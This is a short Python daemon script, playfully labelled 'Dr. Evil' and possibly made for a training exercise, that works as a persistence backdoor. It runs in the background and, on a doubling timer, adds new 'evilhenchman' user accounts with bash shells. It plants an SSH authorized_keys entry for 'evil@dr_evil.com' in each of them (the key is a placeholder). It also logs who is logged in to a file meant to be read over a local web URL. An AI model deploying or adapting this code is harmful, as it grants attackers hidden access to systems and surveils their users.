#!/usr/bin/python

import daemon
import time
import subprocess
import os
import pwd
import grp
import lockfile
import sys

# This is my super secret daemon I have created.


def do_evil():
	""" Do Evil
	
		Add a new henchman to the system, doubling the time between creating each new henchman login.
		Also keep a log of who is on the system. 
		The log will be readable from the URL http://localhost:4566/evil.log
	"""
	henchman_count = 1
	time_to_add_henchman = 90
	time_elapsed = 0
	interval = 120
	
	print("starting to run the loop")
	while True:
		with open("/usr/local/games/dr_evil/evil.log", "a") as f:
			
			# write the current time to the log
			f.write("The time is now " + time.ctime() + "\n")
			
			# write out who is currently logged into the system to the log
			f.write(subprocess.check_output(["/usr/bin/who"]))
			
			f.write("Time elpased: {0}. time_to_add:{1}\n".format(time_elapsed, time_to_add_henchman))
			# if enough time has elapsed, create a new henchman login and log it
			if (time_to_add_henchman < time_elapsed):
				new_henchman = "evilhenchman" + str(henchman_count)
				add_henchman(new_henchman, f)
				f.write("Adding new henchman: " + new_henchman + "\n")
				henchman_count += 1
				time_to_add_henchman *= 2
				
		# sleep for the interval specified and update our timer
		time.sleep(interval)
		time_elapsed += interval
		
def add_henchman(name, log):
	"""Add a new henchman to the system."""
	
	print("adding new henchman " + name)
	cmd = ["useradd",
	 	   " --home /usr/local/games/" + name,
		   " --groups evil",
		   " --create-home",
		   " --shell /bin/bash",
		   " --user-group",
		   name,
	   ]
	log.write(' '.join(cmd) + "\n")
	subprocess.call(" ".join(cmd),shell=True, stderr=sys.stdout, stdout=sys.stdout)
	
	# need to create a .ssh directory to store authentication key
	ssh_dir = "/usr/local/games/{0}/.ssh".format(name)
	if not os.path.exists(ssh_dir):
		os.makedirs(ssh_dir)
		uid = pwd.getpwnam(name).pw_uid
		gid = grp.getgrnam("evil").gr_gid
		os.chown(ssh_dir,uid,gid)
		os.chmod(ssh_dir,0700)
	
	# add the evil ssh public key so my henchman can login to the system
	with open("/usr/local/games/{0}/.ssh/authorized_keys".format(name), "w") as f:
		f.write("ssh-rsa AAAAB3NzaC1yc2EBOGUSKEY== evil@dr_evil.com")
	

def run():
	
	with daemon.DaemonContext(
		working_directory = '/usr/local/games/dr_evil',
		pidfile = lockfile.FileLock('/usr/local/games/dr_evil/dr_evil.pid')
	):
		do_evil()

if __name__ == "__main__":
	# print("Starting daemon")
	# run()
	run()
